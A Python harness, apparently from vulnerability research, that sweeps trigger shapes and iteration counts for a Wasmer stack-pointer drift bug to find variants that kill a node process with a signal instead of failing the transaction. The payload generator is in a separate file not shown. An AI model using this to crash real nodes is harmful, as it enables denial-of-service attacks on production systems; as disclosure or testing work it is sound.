#!/usr/bin/env python3
"""
Can the attacker make the node process DIE instead of failing the tx?

Wasmer can only recover from a trap while the stack pointer is still inside
the bounds of the wasm stack (lib/vm/src/trap/traphandlers.rs):

    if !self.coro_trap_handler.stack_ptr_in_bounds(sp) {
        return false;        // -> the signal is re-raised with SIG_DFL
    }                        // -> the process dies

The "implicit else" bug moves the stack pointer 8 bytes lower for every
execution of a false `if` with a spilled block parameter.  The first write
that touches the guard page below the wasm stack therefore traps with a stack
pointer that is *below* the stack's low bound.  How far below depends on the
size of the drift step (8 bytes per `if`, and an attacker can put many `if`s
in the same loop iteration) and on the exact number of iterations.

This script sweeps the trigger shape and the iteration count, running each
variant in a child process with no extra SIGSEGV handler (exactly like
production) and reports every variant where the child is killed by a signal.
"""
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))

CRASH = "CRASH_TEST_CHILD"


def main():
    child = os.path.join(HERE, "crash_test.py")
    if len(sys.argv) > 1 and sys.argv[1] == "--child":
        import crash_test as CT
        CT.child(int(sys.argv[2]), int(sys.argv[3]), True, 0, 0, False)
        return

    print("Busqueda de una forma que mate el proceso del nodo (produccion)")
    print("=" * 88)
    print("%-10s %-12s %-12s %s" % ("if/iter", "iteraciones", "proceso", "detalle"))
    print("-" * 88)
    kills = 0
    trials = 0
    for ifs in (1, 2, 8, 64, 600, 1024, 4096, 8192):
        base = max(1, 1048576 // (8 * ifs))
        for delta in range(-4, 5):
            iters = base + delta
            if iters < 1:
                continue
            trials += 1
            p = subprocess.run(
                [sys.executable, child, "--child", str(ifs), str(iters)],
                capture_output=True, text=True, timeout=900,
            )
            out = (p.stdout or "").strip().replace("\n", " ")
            if p.returncode < 0:
                kills += 1
                print("%-10d %-12d %-12s %s"
                      % (ifs, iters, "MUERTO",
                         "signal %d  <-- EL NODO MUERE" % (-p.returncode)))
            elif p.returncode == 0 and "call stack exhausted" not in out:
                print("%-10d %-12d %-12s %s"
                      % (ifs, iters, "vive", out[:60]))
    print()
    print("formas que matan el proceso: %d de %d probadas" % (kills, trials))


if __name__ == "__main__":
    main()
